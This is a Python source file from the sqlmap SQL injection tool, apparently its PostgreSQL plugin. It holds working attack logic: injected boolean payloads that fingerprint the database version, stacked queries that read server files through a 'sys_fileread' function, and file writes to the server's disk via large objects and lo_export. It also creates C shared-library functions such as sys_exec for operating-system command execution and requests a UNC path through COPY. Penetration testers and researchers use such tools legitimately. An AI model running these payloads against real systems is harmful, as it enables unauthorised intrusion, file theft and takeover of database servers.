#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import os
import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import getRange
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapSyntaxException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.session import setDbms
from lib.core.settings import PGSQL_ALIASES
from lib.core.settings import PGSQL_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.misc import Miscellaneous
from plugins.generic.takeover import Takeover


class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
    """
    This class defines PostgreSQL methods
    """

    def __init__(self):
        self.excludeDbsList = PGSQL_SYSTEM_DBS
        self.sysUdfs        = {
                                # UDF name:     UDF parameters' input data-type and return data-type
                                "sys_exec":     { "input":  [ "text" ], "return": "int4" },
                                "sys_eval":     { "input":  [ "text" ], "return": "text" },
                                "sys_bineval":  { "input":  [ "text" ], "return": "int4" },
                                "sys_fileread": { "input":  [ "text" ], "return": "text" }
                              }

        Enumeration.__init__(self, "PostgreSQL")
        Filesystem.__init__(self)
        Takeover.__init__(self)

        unescaper.setUnescape(PostgreSQLMap.unescape)

    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                #unescaped = "("
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "CHR(%d)" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += "||"

                #unescaped += ")"
                expression = expression.replace(old, unescaped)
        else:
            expression = "||".join("CHR(%d)" % ord(c) for c in expression)

        return expression

    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find("))")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.replace("CHR(", "").replace(")", "")
            oldUpper = oldUpper.split("||")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped)

        return expression

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += "PostgreSQL"
            return value

        actVer      = formatDBMSfp()
        blank       = " " * 15
        value      += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None
            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        """
        References for fingerprint:

        * http://www.postgresql.org/docs/8.4/interactive/release.html (up to 8.4.2)
        """

        if conf.dbms in PGSQL_ALIASES:
            setDbms("PostgreSQL")

            self.getBanner()

            if not conf.extensiveFp:
                return True

        infoMsg = "testing PostgreSQL"
        logger.info(infoMsg)

        randInt = str(randomInt(1))

        payload = agent.fullPayload(" AND %s::int=%s" % (randInt, randInt))
        result  = Request.queryPage(payload)

        if result:
            infoMsg = "confirming PostgreSQL"
            logger.info(infoMsg)

            payload = agent.fullPayload(" AND COALESCE(%s, NULL)=%s" % (randInt, randInt))
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DMBS is not PostgreSQL"
                logger.warn(warnMsg)

                return False

            setDbms("PostgreSQL")

            self.getBanner()

            if not conf.extensiveFp:
                return True

            if inject.getValue("DIV(6, 3)", unpack=False, charsetType=2) == "2":
                kb.dbmsVersion = [">= 8.4.0"]
            elif inject.getValue("SUBSTR(TRANSACTION_TIMESTAMP()::text, 1, 1)", unpack=False, charsetType=2) in ( "1", "2" ) and not inject.getValue("SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)", unpack=False, charsetType=2) in ( "1", "2" ):
                kb.dbmsVersion = [">= 8.3.0", "< 8.4"]
            elif inject.getValue("SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)", unpack=False, charsetType=2):
                kb.dbmsVersion = [">= 8.2.0", "< 8.3.0"]
            elif inject.getValue("GREATEST(5, 9, 1)", unpack=False, charsetType=2) == "9":
                kb.dbmsVersion = [">= 8.1.0", "< 8.2.0"]
            elif inject.getValue("WIDTH_BUCKET(5.35, 0.024, 10.06, 5)", unpack=False, charsetType=2) == "3":
                kb.dbmsVersion = [">= 8.0.0", "< 8.1.0"]
            elif inject.getValue("SUBSTR(MD5('sqlmap'), 1, 1)", unpack=False):
                kb.dbmsVersion = [">= 7.4.0", "< 8.0.0"]
            elif inject.getValue("SUBSTR(CURRENT_SCHEMA(), 1, 1)", unpack=False) == "p":
                kb.dbmsVersion = [">= 7.3.0", "< 7.4.0"]
            elif inject.getValue("BIT_LENGTH(1)") == "8":
                kb.dbmsVersion = [">= 7.2.0", "< 7.3.0"]
            elif inject.getValue("SUBSTR(QUOTE_LITERAL('a'), 2, 1)", unpack=False) == "a":
                kb.dbmsVersion = [">= 7.1.0", "< 7.2.0"]
            elif inject.getValue("POW(2, 3)", unpack=False, charsetType=2) == "8":
                kb.dbmsVersion = [">= 7.0.0", "< 7.1.0"]
            elif inject.getValue("MAX('a')") == "a":
                kb.dbmsVersion = [">= 6.5.0", "< 6.5.3"]
            elif re.search("([\d\.]+)", inject.getValue("SUBSTR(VERSION(), 12, 5)", unpack=False)):
                kb.dbmsVersion = [">= 6.4.0", "< 6.5.0"]
            elif inject.getValue("SUBSTR(CURRENT_DATE, 1, 1)", unpack=False, charsetType=2) == "2":
                kb.dbmsVersion = [">= 6.3.0", "< 6.4.0"]
            elif inject.getValue("SUBSTRING('sqlmap', 1, 1)", unpack=False) == "s":
                kb.dbmsVersion = [">= 6.2.0", "< 6.3.0"]
            else:
                kb.dbmsVersion = ["< 6.2.0"]

            return True
        else:
            warnMsg = "the back-end DMBS is not PostgreSQL"
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if kb.os:
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "character(1000)")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))

        # Windows executables should always have ' Visual C++' or ' mingw'
        # patterns within the banner
        osWindows = ( " Visual C++", "mingw" )

        for osPattern in osWindows:
            query  = "(SELECT LENGTH(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%" + osPattern + "%')>0"
            query  = agent.forgeCaseStatement(query)

            if inject.getValue(query, charsetType=1) == "1":
                kb.os = "Windows"

                break

        if kb.os is None:
            kb.os = "Linux"

        infoMsg = "the back-end DBMS operating system is %s" % kb.os
        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)

    def forceDbmsEnum(self):
        if conf.db not in PGSQL_SYSTEM_DBS and conf.db != "public":
            conf.db = "public"

            warnMsg  = "on PostgreSQL it is only possible to enumerate "
            warnMsg += "on the current schema and on system databases, "
            warnMsg += "sqlmap is going to use 'public' schema as "
            warnMsg += "database name"
            logger.warn(warnMsg)

    def unionReadFile(self, rFile):
        errMsg  = "PostgreSQL does not support file reading with UNION "
        errMsg += "query SQL injection technique"
        raise sqlmapUnsupportedFeatureException, errMsg

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        self.initEnv()

        return self.udfEvalCmd(cmd="'%s'" % rFile, udfName="sys_fileread")

    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        errMsg  = "PostgreSQL does not support file upload with UNION "
        errMsg += "query SQL injection technique"
        raise sqlmapUnsupportedFeatureException, errMsg

    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        wFileSize = os.path.getsize(wFile)

        if wFileSize > 8192:
            errMsg  = "on PostgreSQL it is not possible to write files "
            errMsg += "bigger than 8192 bytes at the moment"
            raise sqlmapUnsupportedFeatureException, errMsg

        self.oid = randomInt()

        debugMsg  = "creating a support table to write the base64 "
        debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "text")

        logger.debug("encoding file to its base64 string value")
        fcEncodedList = self.fileEncode(wFile, "base64", False)

        debugMsg  = "forging SQL statements to write the base64 "
        debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("inserting the base64 encoded file to the support table")

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg  = "create a new OID for a large object, it implicitly "
        debugMsg += "adds an entry in the large objects system table"
        logger.debug(debugMsg)

        # References:
        # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
        # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html
        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
        inject.goStacked("SELECT lo_create(%d)" % self.oid)

        debugMsg  = "updating the system large objects table assigning to "
        debugMsg += "the just created OID the binary (base64 decoded) UDF "
        debugMsg += "as data"
        logger.debug(debugMsg)

        # Refereces:
        # * http://www.postgresql.org/docs/8.3/interactive/catalog-pg-largeobject.html
        # * http://lab.lonerunners.net/blog/sqli-writing-files-to-disk-under-postgresql
        #
        # NOTE: From PostgreSQL site:
        #
        #   "The data stored in the large object will never be more than
        #   LOBLKSIZE bytes and might be less which is BLCKSZ/4, or
        #   typically 2 Kb"
        #
        # As a matter of facts it was possible to store correctly a file
        # large 13776 bytes, the problem arises at next step (lo_export())
        inject.goStacked("UPDATE pg_largeobject SET data=(DECODE((SELECT %s FROM %s), 'base64')) WHERE loid=%d" % (self.tblField, self.fileTblName, self.oid))

        debugMsg  = "exporting the OID %s file content to " % fileType
        debugMsg += "file '%s'" % dFile
        logger.debug(debugMsg)

        # NOTE: lo_export() exports up to only 8192 bytes of the file
        # (pg_largeobject 'data' field)
        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile), silent=True)

        if confirm:
            self.askCheckWrittenFile(wFile, dFile, fileType)

        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)

    def udfSetRemotePath(self):
        # On Windows
        if kb.os == "Windows":
            # The DLL can be in any folder where postgres user has
            # read/write/execute access is valid
            # NOTE: by not specifing any path, it will save into the
            # data directory, on PostgreSQL 8.3 it is
            # C:\Program Files\PostgreSQL\8.3\data.
            self.udfRemoteFile = "%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)

        # On Linux
        else:
            # The SO can be in any folder where postgres user has
            # read/write/execute access is valid
            self.udfRemoteFile = "/tmp/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        if banVer >= "8.4":
            majorVer = "8.4"
        elif banVer >= "8.3":
            majorVer = "8.3"
        elif banVer >= "8.2":
            majorVer = "8.2"
        else:
            errMsg = "unsupported feature on versions of PostgreSQL before 8.2"
            raise sqlmapUnsupportedFeatureException, errMsg

        if kb.os == "Windows":
            self.udfLocalFile += "/postgresql/windows/32/%s/lib_postgresqludf_sys.dll" % majorVer
            self.udfSharedLibExt = "dll"
        else:
            self.udfLocalFile += "/postgresql/linux/32/%s/lib_postgresqludf_sys.so" % majorVer
            self.udfSharedLibExt = "so"

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info("creating UDF '%s' from the binary UDF file" % udf)

            inp = ", ".join(i for i in inpRet["input"])
            ret = inpRet["return"]

            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
            inject.goStacked("DROP FUNCTION %s" % udf)
            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))

            self.createdUdf.add(udf)
        else:
            logger.debug("keeping existing UDF '%s' as requested" % udf)

    def uncPathRequest(self):
        self.createSupportTbl(self.fileTblName, self.tblField, "text")
        inject.goStacked("COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, self.uncPath), silent=True)
        self.cleanup(onlyFileTbl=True)
